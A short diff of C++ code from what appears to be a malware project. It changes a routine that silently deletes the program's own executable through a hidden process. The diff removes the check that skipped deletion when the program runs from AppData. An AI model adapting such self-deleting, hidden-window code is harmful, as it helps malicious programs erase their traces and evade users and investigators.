@@ -5,13 +5,6 @@
 
 void RM::execute(){
 	
-	// don't delete if executing from AppData
-	if (this->util.isExecutingFromAppData()) {
-		printf("Not deleting clone.exe... \n");
-		return;
-	}
-
-	printf("Deleting feelsbadman.exe... \n");
 	char* filename = this->util.getFileName();
 	StringCbPrintf(this->command, 2 * MAX_PATH, REMOVE_COMAND, filename);
 	CreateProcess(NULL, this->command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &this->info, &this->processInfo);
